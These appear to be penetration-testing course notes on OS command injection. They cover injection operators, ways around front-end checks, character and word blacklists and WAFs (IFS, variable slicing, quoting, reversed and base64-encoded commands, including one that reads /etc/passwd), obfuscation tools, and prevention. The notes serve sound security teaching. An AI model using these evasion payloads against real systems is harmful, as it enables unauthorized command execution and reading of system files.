# Command Injections

Command injection = user input lands (directly or indirectly) in a function executing OS commands without sanitization → arbitrary command execution on the back-end server, potentially the whole network. Injection as a class is OWASP Top 10 #3: input misinterpreted as part of the query/code being executed, subverting its intended outcome. Same pattern across types — OS command injection (input in an OS command), code injection (input in an evaluating function), SQLi (input in a query), XSS/HTML injection (input displayed on a page) — plus LDAP, NoSQL, header, XPath, IMAP, ORM and more. New web technologies keep producing new injection types. Core skill: escaping the input string's boundaries into the parent query.

Not web-only: any binary or thick client passing unsanitized input to a system-command function falls to the same methods.

Vulnerable code shapes:

```php
<?php
if (isset($_GET['filename'])) {
    system("touch /tmp/" . $_GET['filename'] . ".pdf");
}
?>
```

```javascript
app.get("/createfile", function(req, res){
    child_process.exec(`touch /tmp/${req.query.filename}.txt`);
})
```

PHP execution functions: `exec`, `system`, `shell_exec`, `passthru`, `popen`. NodeJS: `child_process.exec`, `child_process.spawn`. Every language has equivalents, all exploited identically.

## Detection

For basic command injection, detection = exploitation: append a command through an injection operator and see if the output deviates from the normal result. (Advanced/indirect/blind cases need fuzzing or code review and gradual payload building.)

Recon the function first. Example: a Host Checker taking an IP returns ping output with a single packet transmitted → the command is almost certainly `ping -c 1 OUR_INPUT`. Guess the wrapper command from the output, then test injection into it.

**Injection operators** — expected input, operator, then the command. All work cross-platform (PHP/Linux, .NET/Windows, NodeJS/macOS alike), with noted exceptions:

- `;` (`%3b`) — both commands execute. Fails on Windows CMD (fine in PowerShell)
- New line `\n` (`%0a`) — both execute
- `&` (`%26`) — both execute, second output generally shown first
- `|` (`%7c`) — both execute, only second output shown
- `&&` (`%26%26`) — second runs only if first succeeds
- `||` (`%7c%7c`) — second runs only if first fails
- Backticks `` `` `` (`%60%60`) and `$()` (`%24%28%29`) — sub-shell, Linux only

Operators generalize across injection classes — SQLi (`' ; -- /* */`), LDAP (`* ( ) & |`), XPath (`' or and not substring concat count`), code injection (`' ; -- /* */ $() ${} #{} %{} ^`), path traversal (`../ ..\\ %00`), object injection (`; & |`), XQuery (`' ; -- /* */`), shellcode (`\x \u %u %n`), header injection (`\n \r\n \t %0d %0a %09`). Incomplete list; environment-dependent.

## Injecting Commands

Start with `;` — payload `127.0.0.1; whoami` making the back-end run `ping -c 1 127.0.0.1; whoami`. Always test the final command locally first to validate it before sending.

The app may refuse the payload with a "match the requested format" style error. Check where that validation lives: Firefox dev tools → Network tab (CTRL+SHIFT+E) → click Check → if no request fires but the error appears, validation is front-end only. Extremely common — front-end and back-end built by different teams, or devs trusting front-end checks.

**Bypass**: proxy through Burp/ZAP, intercept a normal request, send to Repeater (CTRL+R), paste the payload, URL-encode it (select → CTRL+U), send. Response shows ping output *plus* whoami output → injected.

## Other Injection Operators

`&&` behaves like `;` when the first command succeeds — `127.0.0.1 && whoami` returns both outputs. Difference shows when the first command fails: `&&` then skips the second entirely.

`||` inverts that: second command runs only when the first *fails* (bash stops after exit code 0). Useless with a working IP — but deliberately break the first command and it shines. Drop the IP entirely:

```bash
ping -c 1 || whoami
# ping: usage error: Destination address required
# 21y4d
```

Payload `|| whoami` — simpler input, cleaner output (only the second command's output comes back). The pattern: when your injection breaks the original command with no way to make both run, switch to `||`.

## Identifying Filters

Back-end mitigations: blacklisted characters/words in the app code, and WAFs with broader detection (SQLi, XSS, etc.).

Fingerprint the blocker: `invalid input` shown inline in the output field = the PHP app itself detected it. A different page displaying your IP and request = WAF denial.

Work out *what* triggered it. Payload `127.0.0.1; whoami` carries three suspects: the `;`, the space, and the word `whoami`. Blacklist filter shape:

```php
$blacklist = ['&', '|', ';', ...SNIP...];
foreach ($blacklist as $character) {
    if (strpos($_POST['ip'], $character) !== false) {
        echo "Invalid input";
    }
}
```

**Identify the blacklisted character** by reducing to one addition at a time. `127.0.0.1` works; `127.0.0.1;` gets denied → `;` is blacklisted. Repeat across the operators to map the whole blacklist.

## Bypassing Space Filters

Most operators turn out blacklisted — except new line `%0a`, usually left alone since payloads may need it. It works on both Linux and Windows, so it becomes the injection operator: `127.0.0.1%0a`.

The space after it gets blocked next (very common blacklist entry for inputs like IPs that should never contain spaces). Several workarounds:

- **Tabs** — `%09` works as a separator on both Linux and Windows: `127.0.0.1%0a%09`
- **$IFS** — Linux environment variable whose default value is space+tab; `${IFS}` expands where the space should be: `127.0.0.1%0a${IFS}`
- **Brace expansion** — bash inserts the spaces itself for brace-wrapped arguments:

```bash
{ls,-la}
```

Same trick in payloads: `127.0.0.1%0a{ls,-la}`. PayloadsAllTheThings' "commands without spaces" page has more.

## Bypassing Other Blacklisted Characters

`/` (Linux) and `\` (Windows) are heavily blacklisted since paths need them. Goal: manufacture any character from pieces that aren't filtered.

**Linux — environment variable slicing**. `${IFS}` substitutes directly, but no variable holds `/` or `;` by itself — slice one out of a longer value instead:

```bash
echo ${PATH}           # /usr/local/bin:/usr/bin:/bin:/usr/games
echo ${PATH:0:1}       # /
echo ${LS_COLORS:10:1} # ;
```

`start:length` syntax; `$HOME` and `$PWD` work for `/` too. Find candidates with `printenv`. In payloads drop the `echo` — the sliced variable sits inline: `127.0.0.1${LS_COLORS:10:1}${IFS}` rebuilds `; ` without a single filtered character.

**Windows** — same idea, different syntax. CMD substring on a variable (`%HOMEPATH%` → `\Users\htb-student`), start position then a negative end offset:

```cmd
echo %HOMEPATH:~6,-11%
```

PowerShell treats the variable as an array — index the character directly:

```powershell
$env:HOMEPATH[0]
```

Enumerate candidates with `Get-ChildItem Env:`.

**Character shifting** — shift any character by one position in the ASCII table. Look up the character before the one you need (`man ascii` — `\` is 92, so `[` on 91), feed it to:

```bash
echo $(tr '!-}' '"-~'<<<[)
```

PowerShell can do the same, just more verbose.

## Bypassing Blacklisted Commands

Characters solved, adding `whoami` back gets blocked again → word blacklist:

```php
$blacklist = ['whoami', 'cat', ...SNIP...];
foreach ($blacklist as $word) {
    if (strpos('$_POST['ip']', $word) !== false) {
        echo "Invalid input";
    }
}
```

Exact string match — obfuscate the word so it runs but doesn't read.

**Linux & Windows — quote insertion.** Shells ignore quotes inside command words:

```bash
w'h'o'am'i
w"h"o"am"i
```

Rules: never mix quote types, count must be even. Payload: `127.0.0.1%0aw'h'o'am'i`.

**Linux only** — backslash and `$@` also vanish, and unlike quotes need no even count:

```bash
who$@ami
w\ho\am\i
```

**Windows only** — caret:

```cmd
who^ami
```

## Advanced Command Obfuscation

For WAFs and advanced filters, basic tricks stop working.

**Case manipulation** — blacklists rarely enumerate case variants. Windows CMD/PowerShell are case-insensitive, so `WhOaMi` runs as-is. Linux is case-sensitive — lowercase it at runtime in a sub-shell:

```bash
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
```

Gotcha: this command contains spaces. A filtered character anywhere in the obfuscated payload still kills the request — swap in `%09` and it works. Alternative lowercase builder:

```bash
$(a="WhOaMi";printf %s "${a,,}")
```

**Reversed commands** — write `imaohw`, reverse it back at execution time. Generate the reversed form first:

```bash
echo 'whoami' | rev
```

Then:

```bash
$(rev<<<'imaohw')
```

The payload never contains the literal command word. Filtering a *character* too? Reverse it along with the command or include it in the reversed string. Windows version:

```powershell
"whoami"[-1..-20] -join ''
iex "$('imaohw'[-1..-20] -join '')"
```

**Encoded commands** — for payloads full of filtered characters, or characters the server will URL-decode and mangle before the shell sees them. Encode the whole payload, decode + execute at runtime — and build the wrapper yourself so it's unique and not signature-matched. base64 (`xxd` for hex as an alternative):

```bash
echo -n 'cat /etc/passwd | grep 33' | base64
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
```

`<<<` here replaces the pipe `|` — itself a filtered character. If `bash` or `base64` are blacklisted words, chain the character-insertion tricks, or swap in `sh` / `openssl` (b64) / `xxd` (hex). Windows equivalent — encode as UTF-16LE base64:

```powershell
[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))
iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
```

Same output producible from Linux: `echo -n whoami | iconv -f utf-8 -t utf-16le | base64`. Further techniques (wildcards, regex, output redirection, integer expansion) on PayloadsAllTheThings.

## Evasion Tools

**Bashfuscator (Linux)**:

```bash
git clone https://github.com/Bashfuscator/Bashfuscator
cd Bashfuscator
pip3 install setuptools==65
python3 setup.py install --user
```

Basic run picks a random technique — output can balloon to over a million characters. Constrain it:

```bash
./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1
```

(`-s` payload size, `-t` execution time.) Verify locally with `bash -c '<payload>'` before sending — the result should execute the original command while bearing no resemblance to it.

**Invoke-DOSfuscation (Windows)** — interactive:

```powershell
git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git
cd Invoke-DOSfuscation
Import-Module .\Invoke-DOSfuscation.psd1
Invoke-DOSfuscation
```

Menu: `TUTORIAL`, `BINARY` (obfuscated binary syntax), `ENCODING` (environment variable encoding), `PAYLOAD`. Usage:

```text
SET COMMAND type C:\Users\htb-student\Desktop\flag.txt
encoding
1
```

Output like `typ%TEMP:~-3,-2% %CommonProgramFiles:~17,-11%:...` runs fine on CMD. No Windows VM? Run it through `pwsh` on Linux — preinstalled on Pwnbox.

## Command Injection Prevention

**System commands** — avoid command-executing functions entirely where possible, especially with user input; even indirect influence counts. Prefer the language's built-in equivalent (PHP `fsockopen` for host-alive checks instead of shelling out to ping). If a system command is unavoidable, validate + sanitize input on the back-end and minimize these call sites to cases with no built-in alternative.

**Input validation** — front-end *and* back-end. Standard formats via built-in filters:

```php
if (filter_var($_GET['ip'], FILTER_VALIDATE_IP)) {
    // call function
} else {
    // deny request
}
```

Non-standard formats via regex (`preg_match`), or JS/NodeJS both sides:

```javascript
if(/^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/.test(ip)){
    // call function
}
else{
    // deny request
}
```

NodeJS also has format libraries (npm `is-ip` → `isIp(ip)`).

**Input sanitization** — the critical layer, always *after* validation (validation can fail on a bad regex). Strip everything the format doesn't need rather than blacklisting words:

```php
$ip = preg_replace('/[^A-Za-z0-9.]/', '', $_GET['ip']);
```

```javascript
var ip = ip.replace(/[^A-Za-z0-9.]/g, '');
```

NodeJS alternative: DOMPurify (`DOMPurify.sanitize(ip)`). When all special characters must survive (user comments), escape instead — PHP `escapeshellcmd`, NodeJS `escape(ip)` — but escaping is weak and routinely bypassed, as this module demonstrated.

**Server configuration** — reduce blast radius for when prevention fails:

- Web server WAF (Apache `mod_security`) plus an external WAF (Cloudflare, Fortinet, Imperva)
- Least privilege: run the web server as a low-priv user (www-data)
- `disable_functions=system,...` in PHP
- `open_basedir = '/var/www/html'` to scope file access
- Reject double-encoded requests and non-ASCII URL characters
- Drop sensitive/outdated libraries and modules (PHP CGI)

Mitigations stack, none are absolute — millions of lines of code means one mistake anywhere reintroduces the vuln. Secure coding + continued pentesting together.